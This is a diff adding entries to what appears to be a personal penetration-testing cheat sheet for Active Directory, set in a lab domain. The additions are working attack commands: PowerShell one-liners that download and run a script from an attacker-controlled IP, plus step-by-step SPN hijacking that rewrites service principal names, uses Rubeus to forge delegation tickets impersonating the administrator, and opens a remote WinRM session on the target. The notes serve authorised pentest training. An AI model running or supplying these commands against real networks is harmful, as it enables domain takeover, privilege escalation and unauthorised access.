@@ -992,6 +992,9 @@ dsacls.exe ' CN=user01,CN=Users,DC=INLANEFREIGHT,DC=LOCAL'
 ### PowerView
 https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon <br/>
 https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
+
+Ghost<br/>
+https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/Get-ConstrainedDelegation.ps1
 ```powershell
 cd /usr/share/windows-resources/powersploit/Recon/
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
@@ -1022,6 +1025,9 @@ Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
 ## 制約ある
 Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof
 Get-DomainComputer -TrustedToAuth | select -Property dnshostname,useraccountcontrol,msds-allowedtodelegateto
+## Ghost
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.96/Get-ConstrainedDelegation.ps1')
+Get-ConstrainedDelegation -CheckOrphaned
 
 # GenericAll to User
 $geneall = Get-ObjectAcl -Identity "UserName" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
@@ -1371,6 +1377,62 @@ scriptPath: targetScripts\logon.bat
 ```
 ```bash
 ldapmodify -H ldap://10.129.229.224 -x -D 'own_user@inlanefreight.local' -w 'pass' -f logonScript.ldif
+```
+
+#### Hijack SPN
+WriteSPN, WriteProperty, GenericWrite and Delegate
+```powershell
+##### Ghost
+```powershell
+# Hijack Ghost
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.96/Get-ConstrainedDelegation.ps1')
+Get-ConstrainedDelegation -CheckOrphaned
+# WriteSPN
+Get-DomainObjectAcl -Identity target_PC | ?{$_.ActiveDirectoryRights -eq 'WriteProperty'}
+# SPN memo
+Get-DomainComputer target_PC | Select-Object -ExpandProperty serviceprincipalname
+
+# Set SPN
+Set-DomainObject -Identity target_PC -Set @{serviceprincipalname='dhcp/Ghost_PC'} -Verbose
+
+# Get Ticket
+.\Rubeus.exe s4u /domain:inlanefreight.local /user:OWN_PC$ /rc4:OWN_PC /impersonateuser:administrator /msdsspn:"dhcp/Ghost_PC" /nowrap
+.\Rubeus.exe tgssub /ticket:<ghost_ticket> /altservice:cifs/target_PC /nowrap
+.\Rubeus.exe ptt /ticket:<new_ticket>
+```
+##### Live Hijack
+```powershell
+# Delegation
+## Get Hijack PC
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.96/Get-ConstrainedDelegation.ps1')
+Get-ConstrainedDelegation
+# WriteSPN
+## Hijack PC
+Get-DomainObjectAcl -Identity Hijack_PC | ?{$_.ActiveDirectoryRights -eq 'WriteProperty'}
+## target_PC
+Get-DomainObjectAcl -Identity target_PC | ?{$_.ActiveDirectoryRights -eq 'WriteProperty'}
+# SPN memo
+(Get-DomainComputer Hijack_PC).serviceprincipalname
+
+# Clear SPN
+Set-DomainObject -Identity Hijack_PC -Clear 'serviceprincipalname' -Verbose
+# Set SPN
+Set-DomainObject -Identity target_PC -Set @{serviceprincipalname='MSSQL/Hijack_PC'} -Verbose
+
+# Get Ticket
+.\Rubeus.exe s4u /domain:inlanefreight.local /user:OWN_PC$ /rc4:OWN_PC /impersonateuser:administrator /msdsspn:"MSSQL/Hijack_PC" /nowrap
+.\Rubeus.exe tgssub /ticket:<hijack_ticket> /altservice:HTTP/target_PC /nowrap
+.\Rubeus.exe ptt /ticket:<new_ticket>
+
+# Restore SPN
+cat SPN.txt | awk '{printf "\x27%s\x27,", $0}'
+## Remove hijack SPN
+Set-DomainObject -Identity Hijack_PC -Set @{
+serviceprincipalname=...
+} -Verbose
+
+# WinRM
+Enter-PSSession -ComputerName target_PC
 ```
 
 ### LOLBIN
